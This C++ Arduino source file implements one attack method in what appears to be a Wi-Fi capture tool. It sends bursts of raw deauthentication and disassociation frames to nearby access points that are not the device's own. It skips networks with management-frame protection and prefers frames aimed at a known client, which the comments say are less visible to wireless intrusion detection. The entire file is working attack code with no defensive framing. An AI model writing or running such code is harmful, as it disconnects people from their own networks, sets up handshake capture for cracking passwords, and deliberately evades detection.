#include "method_ctx.h"
#include <Arduino.h>
#include <string.h>

namespace Cap {
namespace Methods {

void ours(const Ctx& ctx) {
    uint8_t rounds = ctx.kickBurst ? ctx.kickBurst : 1;
    for (uint8_t i = 0; i < ctx.beaconCount; i++) {
        const BeaconSlot& b = ctx.beacons[i];
        if (b.channel != ctx.channel) continue;
        if (ctx.isOwnAp(b.bssid)) continue;
        if (ctx.skipPin(b.bssid)) continue;
        if (b.rssi < ctx.minRssi) continue;
        if (b.pmfCapable) continue; // deauth/disassoc will be dropped, don't waste airtime

        // Prefer an address-1 hit on the known associated client over broadcast:
        // targeted frames are far more likely to be honored and are less visible to a WIDS.
        if (ctx.kickStaOk && memcmp(ctx.kickBssid, b.bssid, 6) == 0) {
            for (uint8_t r = 0; r < rounds; r++) {
                ctx.sendRawMgmt(0xC0, b.bssid, ctx.kickSta);
                ctx.sendRawMgmt(0xA0, b.bssid, ctx.kickSta);
            }
        } else {
            for (uint8_t r = 0; r < rounds; r++) {
                ctx.sendRawMgmt(0xC0, b.bssid, ctx.bcast);
                ctx.sendRawMgmt(0xA0, b.bssid, ctx.bcast);
            }
        }
        yield();
    }
}

CAP_METHOD_REGISTER("OURS", ours, nullptr, nullptr)

} // namespace Methods
} // namespace Cap
